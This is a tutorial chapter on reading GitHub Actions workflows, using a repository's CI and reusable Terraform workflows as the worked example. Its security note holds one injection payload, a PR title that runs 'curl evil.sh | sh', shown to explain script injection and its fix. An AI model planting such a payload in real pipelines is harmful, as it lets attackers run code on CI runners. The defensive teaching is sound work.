# 01 · How to read a workflow

How to read any GitHub Actions file, then this repo's two workflows line by line. By the end you should be able to look at an unfamiliar workflow and say: when it runs, with what permissions, on what machine, what each step changes, and what happens if a step fails.

## Part 1 · Just enough YAML

YAML is a way of writing nested data. Three shapes cover almost everything:

```yaml
name: ci                 # a key with a text value (a "scalar")

branches: [main, dev]    # a list, inline form

branches:                # the same list, block form: each item starts with "- "
  - main
  - dev

jobs:                    # a map (key → value), nested by indentation
  build:
    runs-on: ubuntu-latest
```

Rules that bite:

- **Indentation is structure.** Two spaces per level by convention. Tabs are not allowed.
- **`key: value` needs the space after the colon.**
- **`#` starts a comment** (outside quotes).
- **Quote values that YAML would otherwise reinterpret**: `"1.9.8"` stays text; `1.10` unquoted becomes the number 1.1. `on`, `yes`, `no` can also be read as booleans by some parsers, which is why some people quote `"on":`.
- **`|` starts a multi-line block** that keeps line breaks. That is how `run:` scripts are written.

## Part 2 · The anatomy of any workflow

A workflow has the same skeleton every time. Learn to find these six things first:

```yaml
name: …              # 1. what it is called in the UI
on: …                # 2. WHEN it runs (events)
permissions: …       # 3. WHAT the job token may do
concurrency: …       # 4. what happens if it is triggered twice
env: …               # 5. variables shared by every job
jobs:                # 6. the work: jobs → steps
  <job-id>:
    runs-on: …       #    which machine
    needs: …         #    which jobs must finish first
    if: …            #    run only when this is true
    environment: …   #    deployment target (protection rules, variables, OIDC claim)
    steps:
      - uses: …      #    run an action someone packaged
      - run: …       #    run a shell script
```

Mental model:

- A **workflow** is triggered by an **event**.
- It contains **jobs**. Jobs run **in parallel** unless `needs:` orders them. Each job gets its **own fresh machine**, so files do not carry over between jobs unless you pass them as artifacts or outputs.
- A job contains **steps** that run **in order on the same machine**. If a step fails, the remaining steps are skipped (unless they say `if: always()` or similar) and the job fails.

### Expressions: `${{ … }}`

Anything inside `${{ }}` is evaluated by GitHub **before** the step runs, then substituted into the text. The main contexts:

| Context | Holds | Example |
|---|---|---|
| `github` | The event and run: repo, ref, actor, event payload | `${{ github.ref }}` → `refs/heads/main` |
| `inputs` | Inputs to a reusable workflow or manual run | `${{ inputs.mode }}` |
| `vars` | Configuration variables (repo, org or environment level) | `${{ vars.GCP_WIF_PROVIDER }}` |
| `secrets` | Secrets, masked in logs | `${{ secrets.SLACK_WEBHOOK }}` |
| `env` | Environment variables defined in the workflow | `${{ env.TF_VERSION }}` |
| `steps` | Outputs of earlier steps in this job (needs an `id`) | `${{ steps.plan.outputs.has-changes }}` |
| `needs` | Outputs of jobs this job depends on | `${{ needs.plan.outputs.has-changes }}` |
| `jobs` | In a reusable workflow's `outputs`, the outputs of its jobs | `${{ jobs.terraform.outputs.has-changes }}` |

`a || b` returns `a` if it is non-empty, otherwise `b`. That is how this repo's workflows fall back from an explicit input to an environment variable.

> **Security rule:** never put `${{ }}` that contains user-controlled text (PR titles, branch names, issue bodies) directly inside a `run:` script. It is pasted in as code before the shell sees it, so a PR titled `"; curl evil.sh | sh; "` runs. Pass it through `env:` instead and use `"$VAR"` in the script. Both workflows here follow that rule.

## Part 3 · `ci.yml` line by line

[`ci.yml`](../../.github/workflows/ci.yml) checks this repository. It is the simpler of the two.

```yaml
name: ci
```
The name shown in the Actions tab and in status checks.

```yaml
on:
  pull_request:
  push:
    branches: [main]
  workflow_dispatch:
```
**When it runs.** Three events:
- `pull_request`: any PR opened, updated or reopened against any branch. For PRs from forks, GitHub runs it with a read-only token and no secrets.
- `push` to `main`: after a merge, so `main` is checked too.
- `workflow_dispatch`: a "Run workflow" button for manual runs.

```yaml
permissions:
  contents: read
```
**What the job token may do.** Only read the repository. No writing code, no comments, and, importantly, no `id-token: write`, so this workflow cannot obtain an OIDC token and cannot reach any cloud. Setting `permissions` at the top applies it to every job.

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```
**Duplicate runs.** All runs for the same ref (e.g. the same PR branch) share a group. When you push again, the older run is cancelled. Good for checks; you would **not** do this for deployments, where cancelling halfway is dangerous (see `terraform.yml`).

```yaml
env:
  TF_VERSION: "1.9.8"
  TFLINT_VERSION: "v0.66.0"
  ACTIONLINT_VERSION: "v1.7.12"
```
Tool versions in one place. Quoted so YAML keeps them as text.

```yaml
jobs:
  terraform:
    name: terraform
    runs-on: ubuntu-latest
    timeout-minutes: 15
```
Job `terraform`. `name` is what appears as the status check, and therefore what a ruleset's "required checks" must match exactly. `runs-on: ubuntu-latest` picks a GitHub-hosted Linux VM. `timeout-minutes` kills a hung job (the default is 6 hours of wasted minutes).

```yaml
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
```
**Step 1: get the code.** `uses:` runs an action: `owner/repo@ref`. The ref is a full commit SHA, so it can never change underneath you; the comment records which release it is, and Dependabot updates both. `with:` passes inputs. `persist-credentials: false` stops checkout from leaving the token in `.git/config`, where later steps could pick it up.

```yaml
      - uses: hashicorp/setup-terraform@dfe3c3f8… # v4.0.1
        with:
          terraform_version: ${{ env.TF_VERSION }}
          terraform_wrapper: false
```
**Step 2: install Terraform.** The wrapper is turned off because it rewrites exit codes and output, which breaks scripts that check them.

```yaml
      - name: fmt
        run: terraform fmt -check -recursive -diff
```
**Step 3: formatting.** `run:` executes a shell command. `-check` fails instead of fixing; `-diff` shows what is wrong. A non-zero exit code fails the step, which fails the job.

```yaml
      - name: validate modules and examples
        run: |
          for dir in modules/* examples/*; do
            echo "::group::$dir"
            terraform -chdir="$dir" init -backend=false -input=false > /dev/null
            terraform -chdir="$dir" validate
            echo "::endgroup::"
          done
```
**Step 4: validate every module and example.** `|` makes a multi-line script. `-backend=false` initialises providers without touching any state. `::group::` and `::endgroup::` are **workflow commands**: special lines GitHub turns into collapsible sections in the log. By default `run` uses `bash -e`, so the first failing command stops the script.

```yaml
      - uses: terraform-linters/setup-tflint@6ffdbaa3… # v6.3.2
        with:
          tflint_version: ${{ env.TFLINT_VERSION }}

      - name: tflint
        env:
          GITHUB_TOKEN: ${{ github.token }}
        run: |
          tflint --init --config "$GITHUB_WORKSPACE/.tflint.hcl"
          for dir in modules/* examples/*; do …
```
**Steps 5–6: lint.** tflint catches things `validate` does not (unused declarations, deprecated syntax, provider-specific mistakes). The token is passed as an environment variable only to raise GitHub's download rate limit for plugins. `$GITHUB_WORKSPACE` is the checkout directory.

```yaml
  checkov:
    name: checkov
    …
      - uses: bridgecrewio/checkov-action@45edc9d8… # v12.3139.0
        with:
          config_file: .checkov.yml
```
**Job 2: policy-as-code.** No `needs:`, so it runs **in parallel** with `terraform`. Checkov scans the Terraform and workflows against hundreds of security rules; `.checkov.yml` lists the skipped checks and why.

```yaml
  actionlint:
    …
      - name: actionlint
        run: |
          go install "github.com/rhysd/actionlint/cmd/actionlint@${ACTIONLINT_VERSION}"
          "$(go env GOPATH)/bin/actionlint" -color
```
**Job 3: lint the workflows themselves.** actionlint catches expression typos, unknown contexts and, through shellcheck, bugs in `run:` scripts. Installing with `go install` at a fixed version uses Go's checksum database, so the download is verified.

**Reading summary:** three jobs in parallel, read-only token, no cloud access, any failure blocks the PR once these are required checks.

## Part 4 · `terraform.yml`: the parts that matter

[`terraform.yml`](../../.github/workflows/terraform.yml) is a **reusable workflow**: it does not run on its own; other workflows call it.

```yaml
on:
  workflow_call:
    inputs:
      working-directory:
        type: string
        required: true
      mode:
        type: string
        default: plan
      …
    outputs:
      has-changes:
        value: ${{ jobs.terraform.outputs.has-changes }}
```
`workflow_call` is the event that makes a workflow callable. **Inputs** are its parameters, each with a type. **Outputs** pass results back to the caller, which reads them as `needs.<caller-job>.outputs.has-changes`.

```yaml
permissions:
  contents: read
  id-token: write
```
`id-token: write` is the one permission that lets a job request an OIDC token. Without it, no cloud login is possible. A caller must also grant at least these permissions; a called workflow can never have more than its caller.

```yaml
jobs:
  terraform:
    environment: ${{ inputs.environment }}
    concurrency:
      group: terraform-${{ inputs.working-directory }}-${{ inputs.environment }}
      cancel-in-progress: false
```
- `environment:` puts the job in a GitHub environment. Three effects: that environment's **variables** become `vars.*`, its **protection rules** apply (approval, branch policy, wait timer) before the job starts, and the OIDC token carries `environment: <name>`, which the cloud trust checks.
- `concurrency` with `cancel-in-progress: false` **queues** a second run instead of cancelling the first. You never want two applies on the same state at once, or an apply cut off halfway.

```yaml
    env:
      MODE: ${{ inputs.mode }}
      BACKEND_CONFIG: ${{ inputs.backend-config || vars.TF_BACKEND_CONFIG }}
      TF_VARS_JSON: ${{ inputs.tf-vars-json || vars.TF_VARS_JSON }}
```
Inputs are copied into environment variables, and scripts use `"$MODE"`, never `${{ inputs.mode }}` inline. That is the injection rule from Part 2 in practice. The `||` falls back to the environment's variables, so most callers pass only a directory, environment and mode.

```yaml
      - name: Authenticate to Google Cloud
        if: inputs.cloud == 'gcp'
        uses: google-github-actions/auth@7c6bc770… # v3.0.0
        with:
          workload_identity_provider: ${{ inputs.gcp-workload-identity-provider || vars.GCP_WIF_PROVIDER }}
          service_account: ${{ inputs.gcp-service-account || vars.GCP_DEPLOYER_SA }}
```
A step-level `if:` skips the step when false. This action requests the OIDC token, exchanges it through Workload Identity Federation, and writes a short-lived credential file that Terraform's Google provider picks up automatically. The Azure step does the same with `azure/login`.

```yaml
      - name: Plan
        id: plan
        if: inputs.mode == 'plan'
        run: |
          set +e
          terraform plan -lock-timeout=5m -detailed-exitcode -out=tfplan > plan.log 2>&1
          code=$?
          set -e
          …
          if [ "$code" -eq 2 ]; then echo "has-changes=true" >> "$GITHUB_OUTPUT"; …
```
- `id: plan` names the step so its outputs can be read as `steps.plan.outputs.*`.
- `-detailed-exitcode` makes `terraform plan` exit 0 (no changes), 2 (changes) or 1 (error). Because `run` stops on any non-zero code, `set +e` turns that off just long enough to capture the code.
- Writing `name=value` to the file at `$GITHUB_OUTPUT` creates a step output. The job's `outputs:` block lifts it to job level, and the workflow's `outputs:` lifts it to the caller. Three hops: step → job → workflow.
- Output goes to `plan.log`, not the console. Plans can contain values; only counts and resource addresses go to the run summary (`$GITHUB_STEP_SUMMARY`, a markdown file shown on the run page).

```yaml
      - name: Upload plan
        if: inputs.mode == 'plan'
        uses: actions/upload-artifact@cf430e03… # v7.0.2
        …
      - name: Download plan
        if: inputs.mode == 'apply'
        uses: actions/download-artifact@9000827c… # v8.0.2
      - name: Apply the reviewed plan
        if: inputs.mode == 'apply'
        run: terraform apply -lock-timeout=5m tfplan
```
Jobs do not share disks, so the plan travels between the plan job and the apply job as an **artifact** stored with the run. `terraform apply tfplan` applies exactly that file. If the real infrastructure changed since the plan, Terraform refuses, and the run has to be repeated: the safe failure.

## Check yourself

Answer without looking, then check against the text above.

1. A PR from a fork opens against this repo. Which workflow runs, and can it reach a cloud? Why?
2. You push twice to the same PR branch within a minute. What happens to the first `ci` run? Would the same happen to a `terraform` apply? Why the difference?
3. Where does `has-changes` start, and what are the three hops it takes to reach the caller?
4. Why does the plan step use `set +e`?
5. A teammate writes `run: echo "Deploying ${{ github.head_ref }}"`. What is wrong, and how do you fix it?
6. What three things change when a job adds `environment: prod`?
